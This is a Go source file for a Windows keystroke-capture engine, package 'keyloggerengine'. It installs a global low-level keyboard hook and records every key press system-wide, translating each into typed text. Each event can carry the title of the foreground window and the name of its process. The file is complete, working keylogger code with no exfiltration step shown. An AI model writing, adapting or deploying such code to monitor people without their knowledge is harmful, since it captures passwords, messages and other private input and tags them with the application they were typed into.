//go:build windows

package keyloggerengine

import (
	"context"
	"fmt"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/lxn/win"
	"golang.org/x/sys/windows"
)

type windowsProvider struct{}

type windowsHookSession struct {
	ctx           context.Context
	cancel        context.CancelFunc
	stream        *channelEventStream
	modifiers     *windowsModifierState
	hook          windowsHookHandle
	config        StartConfig
	lastHwnd      win.HWND
	lastTitle     string
	lastProcess   string
	lastPID       uint32
	processCache  map[uint32]string
	cacheMu       sync.Mutex
}

var (
	windowsSessionMu sync.Mutex
	windowsSession   *windowsHookSession
)

type windowsHookHandle uintptr

const (
	whKeyboardLL = 13
	hcAction     = 0
)

var (
	user32                        = syscall.NewLazyDLL("user32.dll")
	procSetWindowsHookExW         = user32.NewProc("SetWindowsHookExW")
	procCallNextHookEx            = user32.NewProc("CallNextHookEx")
	procUnhookWindowsHookEx       = user32.NewProc("UnhookWindowsHookEx")
	procPostThreadMessageW        = user32.NewProc("PostThreadMessageW")
	procGetWindowTextLengthW      = user32.NewProc("GetWindowTextLengthW")
	procGetWindowTextW            = user32.NewProc("GetWindowTextW")
	kernel32                      = syscall.NewLazyDLL("kernel32.dll")
	procQueryFullProcessImageName = kernel32.NewProc("QueryFullProcessImageNameW")
)

func getWindowTextLength(hwnd win.HWND) int {
	ret, _, _ := procGetWindowTextLengthW.Call(uintptr(hwnd))
	return int(ret)
}

func getWindowText(hwnd win.HWND, buf *uint16, maxCount int32) int {
	ret, _, _ := procGetWindowTextW.Call(
		uintptr(hwnd),
		uintptr(unsafe.Pointer(buf)),
		uintptr(maxCount),
	)
	return int(ret)
}

func setWindowsHookEx(idHook int32, callback uintptr, module win.HINSTANCE, threadID uint32) (windowsHookHandle, error) {
	ret, _, err := procSetWindowsHookExW.Call(
		uintptr(idHook),
		callback,
		uintptr(module),
		uintptr(threadID),
	)
	if ret == 0 {
		if err == syscall.Errno(0) {
			err = syscall.EINVAL
		}
		return 0, err
	}
	return windowsHookHandle(ret), nil
}

func callNextHookEx(h windowsHookHandle, nCode int32, wParam, lParam uintptr) uintptr {
	ret, _, _ := procCallNextHookEx.Call(
		uintptr(h),
		uintptr(nCode),
		wParam,
		lParam,
	)
	return ret
}

func unhookWindowsHookEx(h windowsHookHandle) bool {
	ret, _, _ := procUnhookWindowsHookEx.Call(uintptr(h))
	return ret != 0
}

func postThreadMessage(threadID uint32, msg uint32, wParam, lParam uintptr) bool {
	ret, _, _ := procPostThreadMessageW.Call(
		uintptr(threadID),
		uintptr(msg),
		wParam,
		lParam,
	)
	return ret != 0
}

func defaultProviderFactory() func() Provider {
	return func() Provider {
		return &windowsProvider{}
	}
}

func (p *windowsProvider) Start(ctx context.Context, cfg StartConfig) (EventStream, error) {
	if ctx == nil {
		ctx = context.Background()
	}

	normalized := cfg.normalize()
	stream := newChannelEventStream(normalized.BufferSize)

	sessionCtx, cancel := context.WithCancel(ctx)
	session := &windowsHookSession{
		ctx:          sessionCtx,
		cancel:       cancel,
		stream:       stream,
		modifiers:    &windowsModifierState{},
		config:       normalized,
		processCache: make(map[uint32]string),
	}

	ready := make(chan error, 1)

	windowsSessionMu.Lock()
	if windowsSession != nil {
		windowsSessionMu.Unlock()
		cancel()
		stream.Close()
		return nil, fmt.Errorf("keylogger provider already active")
	}
	windowsSession = session
	windowsSessionMu.Unlock()

	go session.run(ready)

	if err := <-ready; err != nil {
		cancel()
		session.cleanup()
		return nil, err
	}

	go func() {
		<-sessionCtx.Done()
		session.cleanup()
	}()

	return stream, nil
}

func (s *windowsHookSession) cleanup() {
	windowsSessionMu.Lock()
	if windowsSession == s {
		windowsSession = nil
	}
	windowsSessionMu.Unlock()
	s.stream.Close()
}

type kbdLLHook struct {
	VkCode      uint32
	ScanCode    uint32
	Flags       uint32
	Time        uint32
	DwExtraInfo uintptr
}

var keyboardProc = syscall.NewCallback(func(nCode int32, wParam uintptr, lParam uintptr) uintptr {
	if nCode == hcAction {
		windowsSessionMu.Lock()
		session := windowsSession
		windowsSessionMu.Unlock()
		if session != nil {
			event := (*kbdLLHook)(unsafe.Pointer(lParam))
			pressed := wParam == win.WM_KEYDOWN || wParam == win.WM_SYSKEYDOWN
			released := wParam == win.WM_KEYUP || wParam == win.WM_SYSKEYUP
			if pressed || released {
				session.emit(pressed, event)
			}
		}
	}
	return callNextHookEx(0, int32(nCode), wParam, lParam)
})

func (s *windowsHookSession) run(ready chan<- error) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	defer s.cancel()

	threadID := win.GetCurrentThreadId()
	module := win.GetModuleHandle(nil)
	hook, err := setWindowsHookEx(whKeyboardLL, keyboardProc, module, 0)
	if err != nil || hook == 0 {
		ready <- ErrProviderUnavailable
		return
	}
	s.hook = hook
	ready <- nil

	quit := make(chan struct{})
	go func() {
		select {
		case <-s.ctx.Done():
			postThreadMessage(threadID, win.WM_QUIT, 0, 0)
		case <-quit:
		}
	}()

	var msg win.MSG
	for {
		ret := win.GetMessage(&msg, 0, 0, 0)
		if ret == 0 || ret == -1 {
			break
		}
		win.TranslateMessage(&msg)
		win.DispatchMessage(&msg)
	}

	close(quit)

	if s.hook != 0 {
		unhookWindowsHookEx(s.hook)
	}
}

func (s *windowsHookSession) getProcessName(pid uint32) string {
	if pid == 0 {
		return ""
	}

	s.cacheMu.Lock()
	if name, ok := s.processCache[pid]; ok {
		s.cacheMu.Unlock()
		return name
	}
	s.cacheMu.Unlock()

	handle, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
	if err != nil {
		return ""
	}
	defer windows.CloseHandle(handle)

	buf := make([]uint16, windows.MAX_PATH)
	size := uint32(len(buf))
	ret, _, _ := procQueryFullProcessImageName.Call(
		uintptr(handle),
		0,
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(unsafe.Pointer(&size)),
	)

	if ret == 0 {
		return ""
	}

	name := filepath.Base(syscall.UTF16ToString(buf[:size]))
	s.cacheMu.Lock()
	if len(s.processCache) > 100 {
		for k := range s.processCache {
			delete(s.processCache, k)
			break
		}
	}
	s.processCache[pid] = name
	s.cacheMu.Unlock()

	return name
}

func (s *windowsHookSession) getForegroundWindowInfo() (string, string) {
	hwnd := win.GetForegroundWindow()
	if hwnd == 0 {
		return "", ""
	}

	if hwnd == s.lastHwnd {
		return s.lastTitle, s.lastProcess
	}

	var pid uint32
	win.GetWindowThreadProcessId(hwnd, &pid)

	title := ""
	titleLen := getWindowTextLength(hwnd)
	if titleLen > 0 {
		buf := make([]uint16, titleLen+1)
		getWindowText(hwnd, &buf[0], int32(len(buf)))
		title = syscall.UTF16ToString(buf)
	}

	process := s.getProcessName(pid)

	s.lastHwnd = hwnd
	s.lastTitle = title
	s.lastProcess = process
	s.lastPID = pid

	return title, process
}

func (s *windowsHookSession) emit(pressed bool, data *kbdLLHook) {
	if data == nil {
		return
	}

	vk := data.VkCode
	if isWindowsModifier(vk) {
		s.modifiers.set(vk, pressed)
	}
	alt, ctrl, shift, meta := s.modifiers.snapshot()

	key := windowsKeyName(vk)
	event := CaptureEvent{
		Timestamp: time.Now().UTC(),
		Key:       key,
		RawCode:   fmt.Sprintf("%d", vk),
		ScanCode:  uint16(data.ScanCode),
		Pressed:   pressed,
		Alt:       alt,
		Ctrl:      ctrl,
		Shift:     shift,
		Meta:      meta,
	}

	if s.config.IncludeWindowTitle || s.config.EmitProcessNames {
		title, process := s.getForegroundWindowInfo()
		if s.config.IncludeWindowTitle {
			event.WindowTitle = title
		}
		if s.config.EmitProcessNames {
			event.ProcessName = process
		}
	}

	if pressed {
		if text := windowsKeyText(vk, shift); text != "" {
			event.Text = text
		}
	}

	s.stream.emit(s.ctx, event)
}

type windowsModifierState struct {
	mu    sync.RWMutex
	alt   bool
	ctrl  bool
	shift bool
	meta  bool
}

func (m *windowsModifierState) set(vk uint32, pressed bool) {
	m.mu.Lock()
	switch vk {
	case win.VK_MENU, win.VK_LMENU, win.VK_RMENU:
		m.alt = pressed
	case win.VK_CONTROL, win.VK_LCONTROL, win.VK_RCONTROL:
		m.ctrl = pressed
	case win.VK_SHIFT, win.VK_LSHIFT, win.VK_RSHIFT:
		m.shift = pressed
	case win.VK_LWIN, win.VK_RWIN:
		m.meta = pressed
	}
	m.mu.Unlock()
}

func (m *windowsModifierState) snapshot() (alt, ctrl, shift, meta bool) {
	m.mu.RLock()
	alt, ctrl, shift, meta = m.alt, m.ctrl, m.shift, m.meta
	m.mu.RUnlock()
	return
}

func isWindowsModifier(vk uint32) bool {
	switch vk {
	case win.VK_MENU, win.VK_LMENU, win.VK_RMENU,
		win.VK_CONTROL, win.VK_LCONTROL, win.VK_RCONTROL,
		win.VK_SHIFT, win.VK_LSHIFT, win.VK_RSHIFT,
		win.VK_LWIN, win.VK_RWIN:
		return true
	default:
		return false
	}
}

func windowsKeyText(vk uint32, shift bool) string {
	if name, ok := windowsPrintableKeys[vk]; ok {
		if shift {
			if shifted, ok := windowsShiftedPrintable[vk]; ok {
				return shifted
			}
			return strings.ToUpper(name)
		}
		return name
	}
	return ""
}

func windowsKeyName(vk uint32) string {
	if name, ok := windowsKeyNames[vk]; ok {
		return name
	}
	return fmt.Sprintf("vk_%d", vk)
}

var windowsPrintableKeys = map[uint32]string{
	'A':               "a",
	'B':               "b",
	'C':               "c",
	'D':               "d",
	'E':               "e",
	'F':               "f",
	'G':               "g",
	'H':               "h",
	'I':               "i",
	'J':               "j",
	'K':               "k",
	'L':               "l",
	'M':               "m",
	'N':               "n",
	'O':               "o",
	'P':               "p",
	'Q':               "q",
	'R':               "r",
	'S':               "s",
	'T':               "t",
	'U':               "u",
	'V':               "v",
	'W':               "w",
	'X':               "x",
	'Y':               "y",
	'Z':               "z",
	'0':               "0",
	'1':               "1",
	'2':               "2",
	'3':               "3",
	'4':               "4",
	'5':               "5",
	'6':               "6",
	'7':               "7",
	'8':               "8",
	'9':               "9",
	win.VK_SPACE:      " ",
	win.VK_OEM_1:      ";",
	win.VK_OEM_PLUS:   "=",
	win.VK_OEM_COMMA:  ",",
	win.VK_OEM_MINUS:  "-",
	win.VK_OEM_PERIOD: ".",
	win.VK_OEM_2:      "/",
	win.VK_OEM_3:      "`",
	win.VK_OEM_4:      "[",
	win.VK_OEM_5:      "\\",
	win.VK_OEM_6:      "]",
	win.VK_OEM_7:      "'",
}

var windowsShiftedPrintable = map[uint32]string{
	'1':               "!",
	'2':               "@",
	'3':               "#",
	'4':               "$",
	'5':               "%",
	'6':               "^",
	'7':               "&",
	'8':               "*",
	'9':               "(",
	'0':               ")",
	win.VK_OEM_MINUS:  "_",
	win.VK_OEM_PLUS:   "+",
	win.VK_OEM_1:      ":",
	win.VK_OEM_2:      "?",
	win.VK_OEM_3:      "~",
	win.VK_OEM_4:      "{",
	win.VK_OEM_5:      "|",
	win.VK_OEM_6:      "}",
	win.VK_OEM_7:      "\"",
	win.VK_OEM_COMMA:  "<",
	win.VK_OEM_PERIOD: ">",
}

var windowsKeyNames = map[uint32]string{
	win.VK_ESCAPE:  "escape",
	win.VK_TAB:     "tab",
	win.VK_SHIFT:   "shift",
	win.VK_CONTROL: "ctrl",
	win.VK_MENU:    "alt",
	win.VK_LWIN:    "meta",
	win.VK_RWIN:    "meta",
	win.VK_SPACE:   "space",
	win.VK_BACK:    "backspace",
	win.VK_RETURN:  "enter",
	win.VK_CAPITAL: "capslock",
	win.VK_F1:      "f1",
	win.VK_F2:      "f2",
	win.VK_F3:      "f3",
	win.VK_F4:      "f4",
	win.VK_F5:      "f5",
	win.VK_F6:      "f6",
	win.VK_F7:      "f7",
	win.VK_F8:      "f8",
	win.VK_F9:      "f9",
	win.VK_F10:     "f10",
	win.VK_F11:     "f11",
	win.VK_F12:     "f12",
	win.VK_DELETE:  "delete",
	win.VK_HOME:    "home",
	win.VK_END:     "end",
	win.VK_PRIOR:   "pageup",
	win.VK_NEXT:    "pagedown",
	win.VK_LEFT:    "left",
	win.VK_RIGHT:   "right",
	win.VK_UP:      "up",
	win.VK_DOWN:    "down",
}
